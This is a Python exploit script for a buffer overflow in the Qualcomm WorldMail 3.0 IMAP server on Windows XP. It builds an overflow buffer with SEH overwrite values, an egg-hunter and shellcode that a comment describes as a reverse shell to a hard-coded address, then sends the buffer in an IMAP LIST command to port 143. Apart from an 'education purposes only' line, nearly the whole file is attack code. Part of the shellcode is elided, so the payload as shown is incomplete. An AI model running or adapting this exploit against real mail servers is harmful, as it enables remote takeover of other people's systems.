#Qualcomm WorldMail 3.0  IMAPD Buffer Overflow on Windows xp 32bit
# Ref : http://www.exploit-db.com/exploits/1380/
#FOR EDUCATION PURPOSES ONLY!
#!/usr/bin/python
import socket
ipaddr="192.168.11.89"
# Reverse shell on 192.168.10.154 port 1030
sc =("T00WT00W"+"\x2b\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd5"
...
seh = '\x1D\x2A\x02\x10' # POP POP RET
nseh = '\xeb\x06\x90\x90'
hunter=("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
buff='\x7D'+'\x41'*449 + sc + nseh + seh + hunter + '\x7D';
print "sending buffer... "

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((ipaddr,143))
s.recv(1024)
s.send('a001 LIST ' + buff + '\r\n')
s.close()
